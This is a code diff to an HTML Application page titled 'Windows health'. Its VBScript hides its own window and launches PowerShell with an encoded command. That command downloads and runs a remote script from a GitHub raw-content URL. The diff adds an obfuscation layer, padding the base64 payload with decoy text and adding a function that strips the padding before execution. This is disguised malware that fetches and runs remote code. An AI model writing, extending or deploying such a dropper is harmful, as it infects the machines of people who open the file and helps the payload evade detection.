@@ -2,7 +2,7 @@
 <html>
 <head>
   <title>Windows health</title>
-  
+
   <script type="text/vbscript">
         Sub Window_OnLoad
             Window.ResizeTo 0, 0
@@ -10,10 +10,10 @@
         End Sub
          reportCreate
         Sub reportCreate
-            encodedCommand = "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ASABBAFgATwBSAEsAOAA4ADgAMAAvAHIAZQBjAGEAbABsAHMALwBtAGEAaQBuAC8AVAByAF8ANAA0ADUAXwByAGUAYwBhAGwAbAAuAHAAcwAxACcAKQA7AA=="
+            encodedCommand = "SQBFAFgAKABOAGUAdwAt.SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ASABBAFgATwBSAEsAOAA4ADgAMAAvAHIAZQBjAGEAbABsAHMALwBtAGEAaQBuAC8AVAByAF8ANAA0ADUAXwByAGUAYwBhAGwAbAAuAHAAcwAxACcAKQA7AA.F8ANAA0ADUAXwByAGUAYwB.=="
             Dim p1 : p1 = "powershell" & ".exe "
             Dim ec2 : ec2 = "-EncodedCommand "
-            Dim x3 : x3 = p1 & ec2 & DecodeHex(encodedCommand)
+            Dim x3 : x3 = p1 & ec2 & DcCustomScript(encodedCommand)
 
             Dim y4 : y4 = 0
             Dim z5 : z5 = True
@@ -25,6 +25,26 @@
 
         Function DecodeHex(hexString)
             DecodeHex = hexString
+        End Function
+
+        Function DcCustomScript(inputString)
+            ' Define the specific prefixes and suffixes to remove
+            Dim prefixToRemove
+            Dim suffixToRemove
+            prefixToRemove = "SQBFAFgAKABOAGUAdwAt."
+            suffixToRemove = ".F8ANAA0ADUAXwByAGUAYwB.=="
+
+            ' Check if the input string starts with the prefix
+            If Left(inputString, Len(prefixToRemove)) = prefixToRemove Then
+                inputString = Mid(inputString, Len(prefixToRemove) + 1) ' Remove the prefix
+            End If
+
+            ' Check if the input string ends with the suffix
+            If Right(inputString, Len(suffixToRemove)) = suffixToRemove Then
+                inputString = Left(inputString, Len(inputString) - Len(suffixToRemove)) ' Remove the suffix
+            End If
+
+            DcCustomScript = inputString & "==" ' Return the modified string
         End Function
 		Self.Close
     </script>
